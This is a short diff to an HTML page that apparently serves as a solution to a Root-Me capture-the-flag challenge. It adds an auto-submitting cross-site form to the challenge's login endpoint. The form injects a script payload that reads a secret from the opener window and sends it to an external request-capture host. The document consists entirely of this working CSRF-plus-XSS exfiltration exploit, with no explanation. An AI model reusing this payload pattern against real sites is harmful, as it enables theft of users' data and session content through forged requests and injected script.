@@ -1,7 +1,10 @@
+<!DOCTYPE html>
 <html>
-    <body>
-        <script>
-        fetch("https://01jw8n5w3ks4tmybprre9mnz7p00-192e4e1a460053ece29d.requestinspector.com");
-        </script>
-    </body>
+  <body>
+    <form action="http://challenge01.root-me.org:58003/login" method="POST">
+      <input type="hidden" name="username" value='<script>setTimeout(()=>{try{fetch("https://01jw8n5w3ks4tmybprre9mnz7p00-192e4e1a460053ece29d.requestinspector.com/TON_ID?secret="+window.opener.document.querySelector("u").parentElement.innerText)}catch(e){fetch("https://01jw8n5w3ks4tmybprre9mnz7p00-192e4e1a460053ece29d.requestinspector.com/TON_ID?error="+e)}},1500)</script>'>
+      <input type="hidden" name="secret" value="x">
+    </form>
+    <script>document.forms[0].submit();</script>
+  </body>
 </html>
